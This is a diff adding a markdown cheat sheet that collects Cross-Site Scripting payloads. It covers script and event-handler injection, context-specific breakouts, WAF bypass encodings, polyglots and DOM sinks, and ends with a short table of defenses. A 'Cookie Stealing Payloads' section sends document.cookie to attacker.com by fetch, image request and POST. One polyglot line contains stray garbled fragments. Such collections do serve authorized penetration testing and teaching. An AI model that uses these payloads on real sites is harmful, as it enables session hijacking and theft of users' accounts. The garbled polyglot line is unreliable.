@@ -1,0 +1,176 @@
+---
+title: "XSS Payload Collection: From Basic to Advanced"
+description: "Comprehensive collection of Cross-Site Scripting payloads for various contexts — HTML, JavaScript, URL, and attribute injection with WAF bypass techniques."
+date: "2025-04-01"
+category: "cheatsheet"
+tags: ["xss", "payloads", "cheatsheet", "bypass"]
+thumbnail: ""
+external_link: ""
+---
+
+## Basic XSS Payloads
+
+### Script Tag Injection
+
+The most straightforward XSS vector — injecting a `<script>` tag:
+
+```html
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+### Event Handler Injection
+
+When `<script>` tags are filtered, use **event handlers**:
+
+```html
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+```
+
+<Alert type="warning">
+Always obtain proper authorization before testing XSS payloads on any system. Unauthorized testing is illegal and unethical.
+</Alert>
+
+## Context-Specific Payloads
+
+### Inside HTML Attributes
+
+When your input lands inside an HTML attribute value:
+
+```html
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+' onclick='alert(1)'
+```
+
+### Inside JavaScript Strings
+
+When input is reflected inside a JavaScript string:
+
+```javascript
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+```
+
+### Inside URL Parameters
+
+```
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+```
+
+## WAF Bypass Techniques
+
+### Case Variation
+
+```html
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+```
+
+### Encoding Tricks
+
+```html
+<script>alert&#40;1&#41;</script>
+<img src=x onerror=\u0061lert(1)>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+```
+
+### Tag Obfuscation
+
+```html
+<script/src=data:,alert(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+```
+
+### Double Encoding
+
+```
+%253Cscript%253Ealert(1)%253C/script%253E
+```
+
+## Cookie Stealing Payloads
+
+### Basic Exfiltration
+
+```html
+<script>
+fetch('https://attacker.com/steal?c='+document.cookie)
+</script>
+```
+
+### Image-Based Exfiltration
+
+```html
+<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
+```
+
+### Fetch with POST
+
+```html
+<script>
+fetch('https://attacker.com/log', {
+  method: 'POST',
+  body: JSON.stringify({
+    cookies: document.cookie,
+    url: window.location.href
+  })
+})
+</script>
+```
+
+## Polyglot Payloads
+
+These payloads work across **multiple contexts**:
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%0telerik11telerik/telerik/oNcliCk=alert()//
+```
+
+```html
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)>
+```
+
+## DOM-Based XSS
+
+### Common Sinks
+
+```javascript
+// Dangerous functions that can execute attacker input
+document.write(userInput)
+element.innerHTML = userInput
+eval(userInput)
+setTimeout(userInput, 1000)
+location.href = userInput
+```
+
+### Testing DOM XSS
+
+```
+http://target.com/page#<img src=x onerror=alert(1)>
+http://target.com/page?default=<script>alert(1)</script>
+```
+
+<Alert type="tip">
+Use browser DevTools (Sources tab) to set breakpoints on known DOM XSS sink functions and trace the data flow from source to sink.
+</Alert>
+
+## Prevention Reference
+
+| Defense | Description |
+|---------|-------------|
+| **Output Encoding** | Encode user data based on output context (HTML, JS, URL) |
+| **CSP Headers** | `Content-Security-Policy: script-src 'self'` |
+| **HttpOnly Cookies** | Prevents JavaScript access to session cookies |
+| **Input Validation** | Whitelist allowed characters |
+| **Sanitization Libraries** | DOMPurify for client-side, Bleach for Python |
